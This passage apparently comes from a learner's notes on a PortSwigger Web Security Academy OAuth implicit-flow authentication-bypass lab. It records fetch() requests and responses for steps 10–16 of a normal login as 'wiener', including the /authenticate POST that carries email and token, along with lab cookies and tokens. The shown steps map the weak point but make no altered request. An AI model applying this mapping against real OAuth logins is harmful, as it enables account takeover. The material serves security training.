    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9,es;q=0.8",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "cookie": "_interaction=6ZjkMMmQLjW7PNYfnJq_L; _session=z6LM7b1_vGNSFRcF6WlQY; _session.legacy=z6LM7b1_vGNSFRcF6WlQY",
    "Referer": "https://oauth-0ad80036049fc0f5c0a08aba0254002a.web-security-academy.net/interaction/6ZjkMMmQLjW7PNYfnJq_L",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "POST"
});

HTTP/1.1 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Location: https://oauth-0ad80036049fc0f5c0a08aba0254002a.web-security-academy.net/auth/6ZjkMMmQLjW7PNYfnJq_L
Date: Sat, 25 Jun 2022 10:35:34 GMT
Connection: close
Keep-Alive: timeout=5
Content-Encoding: gzip
Content-Length: 0


10. Redirect to auth URL

fetch("https://oauth-0ad80036049fc0f5c0a08aba0254002a.web-security-academy.net/auth/6ZjkMMmQLjW7PNYfnJq_L", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9,es;q=0.8",
    "cache-control": "max-age=0",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "cookie": "_interaction_resume=6ZjkMMmQLjW7PNYfnJq_L; _session=z6LM7b1_vGNSFRcF6WlQY; _session.legacy=z6LM7b1_vGNSFRcF6WlQY",
    "Referer": "https://oauth-0ad80036049fc0f5c0a08aba0254002a.web-security-academy.net/interaction/6ZjkMMmQLjW7PNYfnJq_L",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "GET"
});


HTTP/1.1 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Set-Cookie: _interaction_resume=; path=/auth/6ZjkMMmQLjW7PNYfnJq_L; expires=Thu, 01 Jan 1970 00:00:00 GMT; samesite=lax; secure; httponly
Set-Cookie: _session=WbPhRwqx5T9x_Zid5xVmk; path=/; expires=Sat, 09 Jul 2022 10:35:34 GMT; samesite=none; secure; httponly
Set-Cookie: _session.legacy=WbPhRwqx5T9x_Zid5xVmk; path=/; expires=Sat, 09 Jul 2022 10:35:34 GMT; secure; httponly
Location: https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/oauth-callback#access_token=kTjSDDPAlb77RaoVCYA434t-jBLA7Gr3BmWjDZcA8wk&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
Content-Type: text/html; charset=utf-8
Date: Sat, 25 Jun 2022 10:35:34 GMT
Connection: close
Keep-Alive: timeout=5
Content-Encoding: gzip
Content-Length: 232


// 11. Redirect to callback

fetch("https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/oauth-callback", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9,es;q=0.8",
    "cache-control": "max-age=0",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-site",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "cookie": "session=5IN7ZJAryE1los7PexQCsi5dfdGqT4wt",
    "Referer": "https://oauth-0ad80036049fc0f5c0a08aba0254002a.web-security-academy.net/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "GET"
});

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Encoding: gzip
Connection: close
Content-Length: 402

// 12. Check header options on /me path

// 13. Get /me path

fetch("https://oauth-0ad80036049fc0f5c0a08aba0254002a.web-security-academy.net/me", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9,es;q=0.8",
    "authorization": "Bearer kTjSDDPAlb77RaoVCYA434t-jBLA7Gr3BmWjDZcA8wk",
    "content-type": "application/json",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "Referer": "https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "GET"
});

HTTP/1.1 200 OK
X-Powered-By: Express
Vary: Origin
Access-Control-Allow-Origin: https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net
Access-Control-Expose-Headers: WWW-Authenticate
Pragma: no-cache
Cache-Control: no-cache, no-store
Content-Type: application/json; charset=utf-8
Date: Sat, 25 Jun 2022 10:35:35 GMT
Connection: close
Keep-Alive: timeout=5
Content-Encoding: gzip
Content-Length: 87

// 14. Authenticate the payload

fetch("https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/authenticate", {
  "headers": {
    "accept": "application/json",
    "accept-language": "en-US,en;q=0.9,es;q=0.8",
    "content-type": "application/json",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "cookie": "session=5IN7ZJAryE1los7PexQCsi5dfdGqT4wt",
    "Referer": "https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/oauth-callback",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": "{\"email\":\"wiener@hotdog.com\",\"username\":\"wiener\",\"token\":\"kTjSDDPAlb77RaoVCYA434t-jBLA7Gr3BmWjDZcA8wk\"}",
  "method": "POST"
});

HTTP/1.1 302 Found
Location: /
Set-Cookie: session=fUzxS5p2KDZS5mxbsB65US1PZPT4KKCd; Secure; HttpOnly; SameSite=None
Content-Encoding: gzip
Connection: close
Content-Length: 0

// 15. Get the root (not sure what this is doing...)

fetch("https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/", {
  "headers": {
    "accept": "application/json",
    "accept-language": "en-US,en;q=0.9,es;q=0.8",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "cookie": "session=fUzxS5p2KDZS5mxbsB65US1PZPT4KKCd",
    "Referer": "https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/oauth-callback",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "GET"
});

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Encoding: gzip
Connection: close
Content-Length: 2453

// 16. Get main page again


fetch("https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9,es;q=0.8",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "upgrade-insecure-requests": "1",
    "cookie": "session=fUzxS5p2KDZS5mxbsB65US1PZPT4KKCd",
    "Referer": "https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/oauth-callback",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "GET"
});


HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Encoding: gzip
Connection: close
Content-Length: 2453


<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <title>&#65;&#117;&#116;&#104;&#101;&#110;&#116;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#32;&#98;&#121;&#112;&#97;&#115;&#115;&#32;&#118;&#105;&#97;&#32;&#79;&#65;&#117;&#116;&#104;&#32;&#105;&#109;&#112;&#108;&#105;&#99;&#105;&#116;&#32;&#102;&#108;&#111;&#119;</title>
    </head>
    <body>
            <script src="/resources/labheader/js/labHeader.js"></script>
            <div id="academyLabHeader">
    <section class='academyLabBanner'>
        <div class=container>
            <div class=logo></div>
                <div class=title-container>
                    <h2>Authentication bypass via OAuth implicit flow</h2>
                    <a class=link-back href='https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow'>
                        Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                        <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                            <g>
                                <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                            </g>
                        </svg>
                    </a>
                </div>
                <div class='widgetcontainer-lab-status is-notsolved'>
                    <span>LAB</span>
                    <p>Not solved</p>
                    <span class=lab-status-icon></span>
                </div>
            </div>
        </div>
    </section>
</div>
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account?id=wiener">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/10.jpg"></a>
                        <h2>I'm A Photoshopped Girl Living In A Photoshopped World</h2>
                        <p>I don't know what I look like anymore. I never use a mirror, I just look at selfies and use the mirror App on my cell. The mirror App is cool, I always look amazing, and I can change my...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/63.jpg"></a>
                        <h2>Shopping Woes</h2>
                        <p>I'm one of those really annoying people you don't want to get stuck behind in the grocery store. I love to chat, and boy can I chat, to the cashier. My money is always at the bottom of my rucksack,...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/8.jpg"></a>
                        <h2>Grandma's on the net</h2>
                        <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The Facebook, The Twitter...the ones I love the most are the ones who show they have...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/55.jpg"></a>
                        <h2>I'm At A Loss Without It - Leaving Your Smartphone Behind</h2>
                        <p>The other day I left my purse in a friend's car. This led to the most disturbing 19 hours of my life until it was returned to me.</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/18.jpg"></a>
                        <h2>Protect Your Smart Home Gadgets From Cyber Attacks</h2>
                        <p>While we've been sleeping in beds that don't cook breakfast and having to switch the overhead lights on ourselves, some of the more privileged in our communities have been under attack. A home invasion of a different kind. The attacks...</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/6.jpg"></a>
                        <h2>Fake News</h2>
                        <p>Is it just me that finds the way people share things on social media, without checking into them really disturbing? I've started checking things out now, not because I want to share but so I can somehow, politely, let them...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/44.jpg"></a>
                        <h2>If I Close My Eyes You Can't See Me</h2>
                        <p>A young man in Ohio was shocked to discover his Mom and Grandma had been witness to his inappropriate online behavior. Forgetting how everyone you have in your friendship circle is inextricably connected on social media, he didn't hold back...</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/14.jpg"></a>
                        <h2>Making The Holidays Special Again</h2>
                        <p>This time of year I tend to mourn the loss of my little ones, all grown up with no surprises left to give them. Last year I found a way to combat this melancholy, and I thought I'd share what...</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/30.jpg"></a>
                        <h2>Benefits of Travelling</h2>
                        <p>Travelling is such an emotive word. It can excite some, scare others and conjure images of grubby millennials backpacking around the far reaches of the earth for a few. It is however, a word that can mean whatever it is...</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/31.jpg"></a>
                        <h2>Finding Inspiration</h2>
                        <p>I don't care who you are or where you're from aren't just poignant Backstreet Boys lyrics, they also ring true in life, certainly as far as inspiration goes. We all lack drive sometimes, or perhaps we have the drive but...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                    </section>
                </div>
            </section>
        </div>
    </body>
</html>

(anonymous) @ https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/oauth-callback:24
(anonymous) @ https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/oauth-callback:24
